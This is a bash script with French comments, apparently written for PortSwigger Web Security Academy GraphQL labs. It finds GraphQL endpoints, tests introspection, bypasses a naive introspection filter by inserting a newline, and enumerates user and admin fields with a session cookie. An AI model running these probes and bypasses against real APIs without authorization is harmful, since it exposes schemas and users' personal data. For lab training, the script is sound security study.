#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your-session-cookie>"
COMMON_ENDPOINTS=("/graphql" "/api" "/api/graphql" "/graphql/api" "/graphql/graphql" "/graphql/v1" "/api/v1/graphql")
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Découverte automatique de l’endpoint GraphQL
discover_graphql_endpoint() {
    print_sep
    echo "[1] Recherche automatique de l’endpoint GraphQL..."
    for ep in "${COMMON_ENDPOINTS[@]}"; do
        url="$TARGET_URL$ep"
        resp=$(curl -sk -X POST -H "Content-Type: application/json" -b "$COOKIE" --data '{"query":"{__typename}"}' "$url")
        if echo "$resp" | grep -q "__typename"; then
            echo "  [+] Endpoint GraphQL trouvé : $url"
            export GRAPHQL_ENDPOINT="$url"
            return 0
        fi
    done
    echo "  [-] Aucun endpoint GraphQL courant détecté."
    return 1
}

# 2. Analyse de l’introspection
test_introspection() {
    print_sep
    echo "[2] Test d’introspection GraphQL..."
    INTROSPECTION='{"query":"query{__schema{types{name}}}"}'
    resp=$(curl -sk -X POST -H "Content-Type: application/json" -b "$COOKIE" --data "$INTROSPECTION" "$GRAPHQL_ENDPOINT")
    if echo "$resp" | grep -q "__schema"; then
        echo "  [+] Introspection activée ! Le schéma est exposé."
        echo "  [Extrait]:"
        echo "$resp" | head -c 500
    else
        echo "  [-] Introspection désactivée ou filtrée."
    fi
}

# 3. Bypass d’introspection (regex naïf)
test_introspection_bypass() {
    print_sep
    echo "[3] Tentative de bypass d’introspection (regex naïf)..."
    INTROSPECTION_BYPASS='{"query":"query{__schema\n{types{name}}}"}'
    resp=$(curl -sk -X POST -H "Content-Type: application/json" -b "$COOKIE" --data "$INTROSPECTION_BYPASS" "$GRAPHQL_ENDPOINT")
    if echo "$resp" | grep -q "__schema"; then
        echo "  [+] Bypass réussi ! Introspection accessible avec caractère spécial."
        echo "  [Extrait]:"
        echo "$resp" | head -c 500
    else
        echo "  [-] Bypass échoué ou introspection réellement désactivée."
    fi
}

# 4. Test de requêtes universelles et énumération de base
test_universal_queries() {
    print_sep
    echo "[4] Test de requêtes universelles et énumération"
    # __typename
    QUERY_TYPENAME='{"query":"query{__typename}"}'
    resp=$(curl -sk -X POST -H "Content-Type: application/json" -b "$COOKIE" --data "$QUERY_TYPENAME" "$GRAPHQL_ENDPOINT")
    if echo "$resp" | grep -q "__typename"; then
        echo "  [+] __typename disponible : $(echo "$resp" | grep -o '"__typename":"[^"]*"' | head -1)"
    else
        echo "  [-] __typename non disponible."
    fi
    # Query d’énumération basique (users, admin, etc.)
    for field in users user admin account profile; do
        Q="{\"query\":\"query{$field{id name email}}\"}"
        resp=$(curl -sk -X POST -H "Content-Type: application/json" -b "$COOKIE" --data "$Q" "$GRAPHQL_ENDPOINT")
        if echo "$resp" | grep -E -q "id|name|email"; then
            echo "  [+] Champ $field accessible !"
            echo "    [Extrait]: $(echo "$resp" | head -c 200)"
        fi
    done
}

# 5. Contrôle et conseils
print_control_and_tips() {
    print_sep
    echo "[5] Contrôle et conseils"
    echo "- Si introspection est activée, récupérez le schéma et explorez les queries/mutations sensibles."
    echo "- Si elle est désactivée, testez le bypass (caractères spéciaux, GET, x-www-form-urlencoded)."
    echo "- Testez les requêtes universelles (__typename, users, admin, etc.) pour détecter des fuites de données."
    echo "- Pour l’attaque, utilisez Burp Suite (onglet GraphQL) pour manipuler et automatiser les requêtes[2]."
    echo "- Pour chaque réponse, vérifiez la présence de données sensibles, d’erreurs ou de comportements inattendus."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/graphql"
}

# 6. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Découverte automatique de l’endpoint GraphQL."
    echo "2. Test d’introspection et bypass éventuel."
    echo "3. Requêtes universelles pour énumérer et détecter des fuites."
    echo "4. Contrôle des résultats et conseils pour aller plus loin."
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger GraphQL API : analyse, attaque et contrôle ==="
discover_graphql_endpoint || exit 1
test_introspection
test_introspection_bypass
test_universal_queries
print_control_and_tips
print_summary

# End of script
